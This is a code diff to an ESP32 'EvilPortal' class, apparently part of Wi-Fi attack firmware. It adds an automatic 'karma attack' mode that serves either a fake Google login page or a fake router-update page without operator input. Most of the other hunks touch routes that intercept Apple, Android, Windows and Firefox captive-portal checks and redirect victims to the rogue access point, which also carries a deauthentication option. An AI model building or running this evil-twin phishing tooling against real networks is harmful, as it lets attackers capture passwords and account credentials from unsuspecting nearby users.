@@ -8,8 +8,8 @@
 #include "esp_wifi.h"
 #include "wifi_atks.h"
 
-EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd)
-    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), webServer(80) {
+EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPwd, bool autoMode)
+    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode), webServer(80) {
     if (!setup()) return;
 
     beginAP();
@@ -46,6 +46,19 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     }
 }
 bool EvilPortal::setup() {
+    // Auto-mode for karma attack - skip menu and load template directly
+    if (_autoMode) {
+        // Choose template based on AP name or verification flag
+        if (apName.indexOf("router") != -1 || apName.indexOf("update") != -1 || 
+            apName.indexOf("firmware") != -1 || _verifyPwd) {
+            loadDefaultHtml_one(); // Router update template
+        } else {
+            loadDefaultHtml(); // Default Google login
+        }
+        return true;
+    }
+
+    // Manual mode - show template selection menu
     options = {
         {"Custom Html", [this]() { loadCustomHtml(); }}
     };
@@ -118,45 +131,45 @@ void EvilPortal::setupRoutes() {
         // Apple devices and many Android devices check this
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
     });
-    
+
     webServer.on("/gen_204", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Alternative for some devices
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
     });
-    
+
     webServer.on("/hotspot-detect.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Apple specific
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
     });
-    
+
     webServer.on("/library/test/success.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Apple specific
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
     });
-    
+
     webServer.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
         // Windows captive portal detection
         request->send(200, "text/plain", "Microsoft NCSI");
     });
-    
+
     webServer.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
         // Windows 10/11 captive portal detection
         request->send(200, "text/plain", "Microsoft Connect Test");
     });
-    
+
     webServer.on("/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Generic redirect endpoint
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
     });
-    
+
     webServer.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
         request->send(200, "text/plain", "success");
     });
-    
+
     webServer.on("/canonical.html", HTTP_GET, [this](AsyncWebServerRequest *request) {
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
     });
-    
+
     webServer.on("/fwlink", HTTP_GET, [this](AsyncWebServerRequest *request) {
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
     });
@@ -166,7 +179,7 @@ void EvilPortal::setupRoutes() {
         // Firefox captive portal detection
         request->send(200, "text/plain", "success");
     });
-    
+
     webServer.on("/client.msftconnecttest.com/redirect", HTTP_GET, [this](AsyncWebServerRequest *request) {
         // Windows specific
         request->redirect("http://" + WiFi.softAPIP().toString() + "/");
@@ -197,7 +210,7 @@ void EvilPortal::setupRoutes() {
 
     webServer.onNotFound([this](AsyncWebServerRequest *request) {
         String url = request->url();
-        
+
         // Handle common captive portal URLs that weren't caught
         if (url.indexOf("detectportal") != -1 || 
             url.indexOf("connecttest") != -1 ||
